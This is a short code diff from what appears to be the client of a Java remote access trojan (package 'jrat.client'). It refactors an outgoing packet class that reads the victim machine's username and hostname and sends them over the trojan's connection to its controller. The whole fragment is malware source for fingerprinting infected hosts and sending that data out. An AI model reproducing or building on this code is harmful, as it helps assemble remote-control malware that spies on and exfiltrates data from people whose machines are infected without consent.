@@ -1,19 +1,17 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
+import jrat.client.Connection;
 import jrat.common.utils.UserUtils;
-import java.io.DataOutputStream;
-
 
 public class Packet5InitUserHost extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		String username = System.getProperty("user.name");
 		String hostname = UserUtils.getHostname();
 		
-		sw.writeLine(username);
-		sw.writeLine(hostname);
+		con.writeLine(username);
+		con.writeLine(hostname);
 	}
 
 	@Override
